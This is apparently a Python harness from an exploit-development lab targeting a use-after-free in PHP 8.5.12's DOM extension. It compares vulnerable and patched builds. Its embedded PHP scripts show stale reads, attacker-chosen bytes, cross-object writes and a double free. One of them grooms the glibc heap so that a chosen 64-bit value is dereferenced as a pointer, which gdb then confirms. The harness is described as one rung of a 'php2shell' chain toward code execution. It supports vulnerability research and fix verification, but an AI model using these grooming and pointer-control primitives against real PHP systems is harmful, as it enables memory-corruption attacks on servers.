#!/usr/bin/env python3
"""DOM reflected-attribute UAF — plain-build control and corruption harness.

Complements lab/repro/php2shell-dom-reflected-attr.py (ASan, rung 3). This one
runs a NON-ASan dom-enabled 8.5.12 CLI so glibc's real allocator is observed.
Build the pair (local only):

  bash lab/php2shell/build-dom-plain.sh 8.5.12
  cp lab/build/php-8.5.12-plain-dom/sapi/cli/php OUT/php-vuln-plain
  patch -p1 -d lab/build/php-8.5.12-plain-dom \
      < lab/php2shell/dom-reflected-attribute-fix.patch
  make -j$(nproc) -C lab/build/php-8.5.12-plain-dom
  cp lab/build/php-8.5.12-plain-dom/sapi/cli/php OUT/php-fixed-plain
  python3 lab/repro/php2shell-dom-reflected-attr-groom.py \
      OUT/php-vuln-plain OUT/php-fixed-plain OUT

Scenarios (all fix-sensitive A/B):
  p1  stale wrapper reads the NEW value instead of the old one;
  p2  stale wrapper reads back 119 fully attacker-chosen bytes;
  p3  write through the stale wrapper corrupts the NEW node (cross-object write);
  p4  reparenting the new node steers the stale wrapper's parentNode;
  p5  empty replacement + normalizeDocument() frees the reused node; the stale
      wrapper's destructor then double-frees it -> glibc abort.
  p6  POINTER CONTROL: 88-byte str_repeat (zend_string_safe_falloc allocates
      len+32 = 120 B = 0x80 chunk, same as xmlNode) puts chosen bytes at chunk
      offset 40 (node->parent); the stale wrapper dereferences exactly that
      chosen 64-bit value in php_dom_object_get_data (php_dom.c:324).
  p7  size calibration negative: 89-byte str_repeat allocates 121 B (0x88),
      a different bin; the chosen bytes never reach node->parent.

p1-p4 use the default allocator; p5/p6/p7 require USE_ZEND_ALLOC=0.
GDB_BIN env (default /usr/bin/gdb) makes the harness verify that the chosen
pointer value actually appears in the fault backtrace.
No network, no non-loopback access.

Usage: python3 php2shell-dom-reflected-attr-groom.py VULN_BIN FIXED_BIN [OUTDIR]
"""
import os
import pathlib
import subprocess
import sys

P1 = r"""<?php
$doc = new DOMDocument(); $doc->loadXML('<root class="old">seed</root>');
$root = $doc->documentElement;
$text = $root->getAttributeNode('class')->firstChild;
$root->className = 'new';
echo "detached: "; var_dump($text->parentNode === null);
echo "text: "; var_dump($text->textContent);
"""

P2 = r"""<?php
$doc = new DOMDocument(); $doc->loadXML('<root class="old">seed</root>');
$root = $doc->documentElement;
$text = $root->getAttributeNode('class')->firstChild;
$chosen = str_repeat('P', 119);
$root->className = $chosen;
echo "same: "; var_dump($text->textContent === $chosen);
echo "len: "; var_dump(strlen($text->textContent));
"""

P3 = r"""<?php
$doc = new DOMDocument(); $doc->loadXML('<root class="old">seed</root>');
$root = $doc->documentElement;
$text = $root->getAttributeNode('class')->firstChild;
$root->className = 'new';
$new = $root->getAttributeNode('class')->firstChild;
$text->nodeValue = 'CROSS-WRITE';
echo "new: "; var_dump($new->textContent);
"""

P4 = r"""<?php
$doc = new DOMDocument();
$doc->loadXML('<root class="old" other="x"><target/></root>');
$root = $doc->documentElement;
$text = $root->getAttributeNode('class')->firstChild;
$root->className = 'new';
$new = $root->getAttributeNode('class')->firstChild;
$target = $root->getElementsByTagName('target')->item(0);
$target->appendChild($new);
echo "parentTag: "; var_dump($text->parentNode->nodeName ?? null);
"""

P5 = r"""<?php
// Empty replacement + normalize free: stale wrapper double-frees at shutdown.
$doc = new DOMDocument(); $doc->loadXML('<root class="old"/>');
$root = $doc->documentElement;
$text = $root->getAttributeNode('class')->firstChild;
$root->className = '';
$doc->normalizeDocument();
echo "READY\n";
$p = $text->parentNode;
var_dump($p === null);
echo "SURVIVED\n";
"""

P6_TEMPLATE = r"""<?php
// POINTER CONTROL: 88-byte str_repeat allocates 88+32 = 120 B (0x80 chunk).
// val[] begins at chunk offset 24, so string indices 16..23 are node->parent
// at chunk offset 40 of the freed xmlNode reused by this string.
$doc = new DOMDocument(); $doc->loadXML('<root class="old"/>');
$root = $doc->documentElement;
$text = $root->getAttributeNode('class')->firstChild;
$root->className = '';
$doc->normalizeDocument();
$s = str_repeat('A', 88);
for ($i = 0; $i < 8; $i++) { $s[16 + $i] = chr(BYTE); }
echo "READY\n";
$p = $text->parentNode;   // dereferences the chosen 64-bit value as a pointer
echo "SURVIVED\n";
"""

P7 = r"""<?php
// Size calibration NEGATIVE: 89-byte str_repeat allocates 121 B (0x88 bin),
// a different glibc size class from the freed 120-B xmlNode (0x80).
$doc = new DOMDocument(); $doc->loadXML('<root class="old"/>');
$root = $doc->documentElement;
$text = $root->getAttributeNode('class')->firstChild;
$root->className = '';
$doc->normalizeDocument();
$s = str_repeat('A', 89);
for ($i = 0; $i < 8; $i++) { $s[16 + $i] = chr(0x42); }
echo "READY\n";
$p = $text->parentNode;
var_dump($p === null);
echo "SURVIVED\n";
"""

SCENARIOS = [
    ("p1", P1, False),
    ("p2", P2, False),
    ("p3", P3, False),
    ("p4", P4, False),
    ("p5", P5, True),
    ("p6", P6_TEMPLATE.replace("BYTE", "0x42"), True),
    ("p7", P7, True),
]


def run(binary, script, path, log, zend_off):
    path.write_text(script)
    env = os.environ.copy()
    if zend_off:
        env["USE_ZEND_ALLOC"] = "0"
    else:
        env.pop("USE_ZEND_ALLOC", None)
    with log.open("wb") as fh:
        cp = subprocess.run([str(binary), "-n", str(path)], stdout=fh,
                            stderr=subprocess.STDOUT, timeout=120, env=env)
    return cp.returncode, log.read_text(errors="replace")


def run_gdb(binary, script, path, log, gdb):
    path.write_text(script)
    env = dict(os.environ, USE_ZEND_ALLOC="0")
    cmd = [str(gdb), "-q", "-batch", "-ex", "set pagination off", "-ex", "run",
           "-ex", "bt 3", "--args", str(binary), "-n", str(path)]
    with log.open("wb") as fh:
        subprocess.run(cmd, stdout=fh, stderr=subprocess.STDOUT, timeout=120, env=env)
    return log.read_text(errors="replace")


def main():
    if len(sys.argv) < 3:
        print(__doc__)
        return 2
    vuln, fixed = pathlib.Path(sys.argv[1]), pathlib.Path(sys.argv[2])
    outdir = pathlib.Path(sys.argv[3]) if len(sys.argv) > 3 else pathlib.Path(
        "lab/build/evidence/w56-domattr-groom")
    outdir.mkdir(parents=True, exist_ok=True)
    gdb = os.environ.get("GDB_BIN") or ("/usr/bin/gdb"
          if pathlib.Path("/usr/bin/gdb").exists() else None)
    results = {}
    for label, script, zend_off in SCENARIOS:
        for name, binary in (("vuln", vuln), ("fixed", fixed)):
            rc, text = run(binary, script, outdir / f"{label}-{name}.php",
                           outdir / f"{label}-{name}.log", zend_off)
            results[(label, name)] = (rc, text)
            print(f"[{label}/{name}] rc={rc} :: {' '.join(text.split())[:180]}")

    def ok(label, needle_v, needle_f):
        v = results[(label, "vuln")]
        f = results[(label, "fixed")]
        return needle_v in v[1] and needle_f in f[1]

    # Confirm the chosen 64-bit value is consumed as the pointer, not just a crash.
    gdb_text = ""
    if gdb:
        p6_script = dict((l, s) for l, s, _ in SCENARIOS)["p6"]
        gdb_text = run_gdb(vuln, p6_script, outdir / "p6-gdb.php",
                           outdir / "p6-gdb.log", gdb)
    chosen = "0x4242424242424242"
    ptr_ok = (chosen in gdb_text and "php_dom_object_get_data" in gdb_text)

    checks = {
        "p1_stale_reads_new": ok("p1", "detached: bool(false)", "detached: bool(true)"),
        "p2_chosen_bytes": ok("p2", "same: bool(true)", "same: bool(false)"),
        "p3_cross_write": ok("p3", 'new: string(11) "CROSS-WRITE"', 'new: string(3) "new"'),
        "p4_parent_steer": ok("p4", 'parentTag: string(6) "target"', "parentTag: NULL"),
        "p5_glibc_double_free": (
            results[("p5", "vuln")][0] != 0
            and "double free" in results[("p5", "vuln")][1]
            and results[("p5", "fixed")][0] == 0
        ),
        "p6_pointer_control": (
            results[("p6", "vuln")][0] != 0
            and ptr_ok
            and results[("p6", "fixed")][0] == 0
            and "SURVIVED" in results[("p6", "fixed")][1]
        ),
        "p7_size_calibration_negative": ok("p7", "SURVIVED", "SURVIVED"),
    }
    verdict = "RUNG4_POINTER_CONTROL" if all(checks.values()) else "INCONCLUSIVE"
    (outdir / "verdict.txt").write_text(
        f"verdict={verdict}\nchosen_pointer={chosen}\n"
        + "".join(f"{k}={v}\n" for k, v in checks.items()))
    print("VERDICT:", verdict)
    return 0 if verdict == "RUNG4_POINTER_CONTROL" else 1


if __name__ == "__main__":
    sys.exit(main())
